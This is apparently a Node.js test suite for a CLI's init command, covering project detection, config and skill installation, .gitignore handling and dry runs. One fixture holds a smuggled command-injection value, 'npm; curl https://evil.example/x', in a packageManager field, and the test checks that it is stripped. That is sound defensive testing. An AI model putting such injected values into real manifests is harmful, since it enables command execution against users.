// tests/init-full.test.js — init v2 (v1.17): one command, everything
// installed, adapted to the project (modeled on GitHub Spec Kit's
// `specify init`). Fixtures live in temp dirs, never in the repo.
// No version literal is hardcoded anywhere in this file — a version
// bump must never be able to stale these tests.

import { test, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  mkdtempSync,
  writeFileSync,
  readFileSync,
  existsSync,
  readdirSync,
  mkdirSync,
  rmSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { detectProject } from "../lib/detect.js";
import { initFull, initProject } from "../lib/init.js";
import {
  listBundledSkills,
  loadBundledSkills,
  addSkill,
  loadSkills,
} from "../lib/skills.js";
import { listBundledAgents } from "../lib/agents.js";
import { listBundledCommands } from "../lib/commands.js";

const CLI = fileURLToPath(new URL("../bin/cli.js", import.meta.url));

// S-30: every fixture dir is registered here and removed after the
// suite — a full init is ~5 MB on disk, and this file used to leak
// one fixture per test into the temp dir on every run.
const madeDirs = [];
function tempDir() {
  const dir = mkdtempSync(join(tmpdir(), "rh-init-full-"));
  madeDirs.push(dir);
  return dir;
}
after(() => {
  for (const dir of madeDirs) rmSync(dir, { recursive: true, force: true });
});

function runCli(args, cwd) {
  return spawnSync(process.execPath, [CLI, ...args], { cwd, encoding: "utf8" });
}

function readConfig(dir) {
  return JSON.parse(readFileSync(join(dir, "harness.config.json"), "utf8"));
}

function writeReactFixture(dir) {
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify(
      {
        name: "demo-app",
        description: "A demo app goal.",
        scripts: { test: "vitest run", lint: "eslint .", build: "vite build" },
        dependencies: { react: "^19.0.0" },
      },
      null,
      2
    )
  );
}

test("detect: Node/React project — stack, validation commands, goal", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  const d = detectProject(dir);
  assert.equal(d.name, "demo-app");
  assert.equal(d.stack.language, "JavaScript");
  assert.equal(d.stack.framework, "React");
  assert.equal(d.stack.packageManager, "npm");
  assert.equal(d.validation.test, "npm test");
  assert.equal(d.validation.lint, "npm run lint");
  assert.equal(d.validation.build, "npm run build");
  assert.equal(d.goal, "A demo app goal.");
});

test("detect: PHP/Laravel project — stack + goal from composer.json", () => {
  const dir = tempDir();
  writeFileSync(
    join(dir, "composer.json"),
    JSON.stringify(
      {
        name: "acme/pantry-api",
        description: "API for the pantry.",
        require: { "laravel/framework": "^11.0" },
      },
      null,
      2
    )
  );
  const d = detectProject(dir);
  assert.equal(d.name, "pantry-api");
  assert.equal(d.stack.language, "PHP");
  assert.equal(d.stack.framework, "Laravel");
  assert.equal(d.goal, "API for the pantry.");
});

test("detect: goal falls back to the README's first plain line", () => {
  const dir = tempDir();
  writeFileSync(
    join(dir, "README.md"),
    "# Cool Tool\n\n![badge](x.svg)\n\nCool Tool tracks every pantry donation in Bogo City.\n"
  );
  const d = detectProject(dir);
  assert.equal(d.goal, "Cool Tool tracks every pantry donation in Bogo City.");
  assert.equal(d.stack.language, null);
});

test("detect: broken manifest never throws — generic detection", () => {
  const dir = tempDir();
  writeFileSync(join(dir, "package.json"), "{ not json");
  const d = detectProject(dir);
  assert.equal(d.stack.language, null);
  assert.ok(d.name.length > 0);
});

test("initFull: React project gets EVERYTHING, adapted", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  const r = initFull(dir);

  const bundledSkills = listBundledSkills();
  const bundledAgents = listBundledAgents();
  const bundledCommands = listBundledCommands();

  // Config: created, adapted, every skill enabled.
  assert.equal(r.config.created, true);
  const config = readConfig(dir);
  assert.equal(config.name, "demo-app");
  assert.equal(config.goal, "A demo app goal.");
  assert.equal(config.stack.framework, "React");
  assert.equal(config.validation.test, "npm test");
  assert.deepEqual([...config.skills].sort(), bundledSkills.map((s) => s.name).sort());
  assert.ok(
    config.rules.some((rule) => rule.includes("`npm test`")),
    "the validation rule names the project's real test command"
  );

  // Skill files on disk — one per bundled skill, organized into the
  // same category folders as the store (fix-team under workflow/).
  const skillFiles = readdirSync(join(dir, "skills"), { recursive: true }).filter((f) =>
    String(f).endsWith(".md")
  );
  assert.equal(skillFiles.length, bundledSkills.length);
  assert.ok(existsSync(join(dir, "skills", "workflow", "fix-team", "SKILL.md")));
  assert.ok(existsSync(join(dir, "skills", "architecture", "system-design", "SKILL.md")));

  // Agents + commands in both runtime formats.
  for (const a of bundledAgents) {
    assert.ok(existsSync(join(dir, ".opencode", "agents", `${a.name}.md`)), `opencode agent ${a.name}`);
    assert.ok(existsSync(join(dir, ".claude", "agents", `${a.name}.md`)), `claude agent ${a.name}`);
  }
  for (const c of bundledCommands) {
    assert.ok(existsSync(join(dir, ".opencode", "commands", `${c.name}.md`)), `opencode command ${c.name}`);
    assert.ok(existsSync(join(dir, ".claude", "commands", `${c.name}.md`)), `claude command ${c.name}`);
  }

  // Memory seeded with the detected truth, and synced runtime files.
  const note = readFileSync(join(dir, "memory", "project.md"), "utf8");
  assert.ok(note.includes("A demo app goal."));
  assert.ok(note.includes("React"));
  assert.ok(note.includes("`npm test`"));
  assert.ok(existsSync(join(dir, "memory", "INDEX.md")));
  assert.ok(existsSync(join(dir, ".opencode", "instructions.md")));

  // The receipt counts come from the run itself.
  assert.equal(r.skills.installed, bundledSkills.length);
  assert.equal(r.agents.installed, bundledAgents.length);
  assert.equal(r.commands.installed, bundledCommands.length);
  assert.ok(r.sync.written > 0);
});

test("initFull: empty folder still installs everything, generically", () => {
  const dir = tempDir();
  const r = initFull(dir);
  assert.equal(r.detection.stack.language, null);
  assert.equal(r.config.created, true);
  const config = readConfig(dir);
  assert.equal(config.skills.length, listBundledSkills().length);
  assert.ok(existsSync(join(dir, "skills", "workflow", "fix-team", "SKILL.md")));
  assert.ok(existsSync(join(dir, "memory", "INDEX.md")));
});

test("initFull: re-run is a refresh — the user's config is never stomped", () => {
  const dir = tempDir();
  initProject(dir);
  const config = readConfig(dir);
  config.rules.push("CUSTOM RULE — do not lose me.");
  config.skills = [];
  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");

  const r = initFull(dir);
  assert.equal(r.config.created, false);
  const after = readConfig(dir);
  assert.ok(after.rules.includes("CUSTOM RULE — do not lose me."));
  // B-5 (contract, lib/init.js:51-52): an existing config is kept
  // exactly as the user left it — a refresh does NOT re-enable any
  // skill the config does not list (previously this asserted the
  // resurrection behaviour: skills.length === every bundled skill).
  assert.equal(after.skills.length, 0);
  assert.deepEqual(
    [...r.skills.availableButNotInstalled].sort(),
    listBundledSkills().map((s) => s.name).sort()
  );
  assert.equal(r.skills.installed, 0);
});

test("initFull: refresh does not resurrect a removed skill, keeps enabled ones", () => {
  const dir = tempDir();
  initProject(dir);
  const config = readConfig(dir);
  config.skills = ["debug-first"];
  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");

  const r = initFull(dir);
  const after = readConfig(dir);
  assert.deepEqual(after.skills, ["debug-first"]);
  assert.ok(existsSync(join(dir, "skills", "quality", "debug-first", "SKILL.md")));
  assert.ok(r.skills.availableButNotInstalled.includes("clone"));
  assert.ok(!after.skills.includes("clone"));
});

test("detect: crafted packageManager string is ignored (W-14)", () => {
  const dir = tempDir();
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify(
      {
        name: "evil-app",
        packageManager: "npm; curl https://evil.example/x #@1.0.0",
        scripts: { test: "vitest run" },
      },
      null,
      2
    )
  );
  const d = detectProject(dir);
  assert.equal(d.stack.packageManager, "npm");
  assert.equal(d.validation.test, "npm test");
  assert.ok(!JSON.stringify(d).includes("curl"));
  assert.ok(!JSON.stringify(d).includes(";"));
});

test("detect: legitimate packageManager string is honoured (W-14)", () => {
  const dir = tempDir();
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify(
      { name: "pnpm-app", packageManager: "pnpm@8.15.0", scripts: { test: "vitest run" } },
      null,
      2
    )
  );
  const d = detectProject(dir);
  assert.equal(d.stack.packageManager, "pnpm");
  assert.equal(d.validation.test, "pnpm test");
});

test("initFull: existing .gitignore gains only the missing harness patterns, once (W-4b)", () => {
  const dir = tempDir();
  initProject(dir);
  const config = readConfig(dir);
  config.skills = [];
  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");
  writeFileSync(join(dir, ".gitignore"), "node_modules/\n*.bak.*\n");

  const r = initFull(dir);
  assert.deepEqual(r.gitignore.added, [".reviewer-harness/graph/"]);
  const text = readFileSync(join(dir, ".gitignore"), "utf8");
  assert.ok(text.includes("node_modules/"));
  assert.ok(text.includes("# reviewer-harness"));
  assert.equal(text.split("*.bak.*").length - 1, 1);
  assert.equal(text.split(".reviewer-harness/graph/").length - 1, 1);

  const r2 = initFull(dir);
  assert.deepEqual(r2.gitignore.added, []);
  const text2 = readFileSync(join(dir, ".gitignore"), "utf8");
  assert.equal(text2, text);
});

test("initFull: no .gitignore — receipt suggests the patterns, creates nothing (W-4b)", () => {
  const dir = tempDir();
  initProject(dir);
  const config = readConfig(dir);
  config.skills = [];
  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");

  const r = initFull(dir);
  assert.equal(existsSync(join(dir, ".gitignore")), false);
  assert.deepEqual(r.gitignore.suggested, ["*.bak.*", ".reviewer-harness/graph/"]);
  assert.match(r.gitignore.suggestion, /\*\.bak\.\*/);
});

test("initFull: --goal overrides the detected goal", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  initFull(dir, { goal: "Ship the demo by Friday." });
  assert.equal(readConfig(dir).goal, "Ship the demo by Friday.");
});

test("initFull dryRun: detects and plans, writes nothing", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  const r = initFull(dir, { dryRun: true });
  assert.equal(r.dryRun, true);
  assert.equal(r.configExists, false);
  assert.equal(r.planned.skills, listBundledSkills().length);
  assert.equal(existsSync(join(dir, "harness.config.json")), false);
  assert.equal(existsSync(join(dir, "skills")), false);
});

test("CLI init --minimal: config only, the old behavior", () => {
  const dir = tempDir();
  const res = runCli(["init", "--minimal"], dir);
  assert.equal(res.status, 0, res.stderr);
  assert.ok(existsSync(join(dir, "harness.config.json")));
  assert.equal(existsSync(join(dir, "skills")), false);
  assert.match(res.stdout, /Config created/);
});

test("CLI init --dry-run: preview only, nothing created", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  const res = runCli(["init", "--dry-run"], dir);
  assert.equal(res.status, 0, res.stderr);
  assert.match(res.stdout, /dry-run/);
  assert.equal(existsSync(join(dir, "harness.config.json")), false);
  assert.equal(existsSync(join(dir, "skills")), false);
});

test("store: every bundled skill carries a category (v1.17.1 organization)", () => {
  const all = loadBundledSkills();
  assert.equal(all.length, listBundledSkills().length);
  assert.ok(all.length > 0);
  for (const s of all) {
    assert.ok(s.category, `skill "${s.name}" has a category`);
  }
  const byName = new Map(all.map((s) => [s.name, s.category]));
  assert.equal(byName.get("fix-team"), "workflow");
  assert.equal(byName.get("system-design"), "architecture");
  assert.equal(byName.get("nodejs-quality"), "backend");
  assert.equal(byName.get("design-taste-frontend"), "frontend");
  assert.equal(byName.get("owasp-top10"), "security");
  // The pinned public listing shape stays { name, description }.
  for (const s of listBundledSkills()) {
    assert.deepEqual(Object.keys(s).sort(), ["description", "name"]);
  }
});

test("store: addSkill installs into the project's matching category folder", () => {
  const dir = tempDir();
  initProject(dir);
  const r = addSkill("fix-team", dir);
  assert.equal(r.enabled, true);
  assert.ok(existsSync(join(dir, "skills", "workflow", "fix-team", "SKILL.md")));
  assert.deepEqual(readConfig(dir).skills, ["fix-team"]);
});

test("store: loadSkills resolves a hand-organized project skills/ folder", () => {
  const dir = tempDir();
  mkdirSync(join(dir, "skills", "quality"), { recursive: true });
  writeFileSync(
    join(dir, "skills", "quality", "debug-first.md"),
    `---\ndescription: Organized by hand\n---\n\nBody.\n`
  );
  const loaded = loadSkills(dir, { skills: ["debug-first"] });
  assert.equal(loaded.length, 1);
  assert.equal(loaded[0].description, "Organized by hand");
});

test("CLI init: full setup in one command, with a receipt", () => {
  const dir = tempDir();
  writeReactFixture(dir);
  const res = runCli(["init"], dir);
  assert.equal(res.status, 0, res.stderr);
  assert.match(res.stdout, /Project: demo-app/);
  assert.match(res.stdout, /Skills : \d+ installed/);
  assert.match(res.stdout, /Done — everything is installed/);
  assert.ok(existsSync(join(dir, "skills", "workflow", "fix-team", "SKILL.md")));
  assert.equal(readConfig(dir).skills.length, listBundledSkills().length);
});
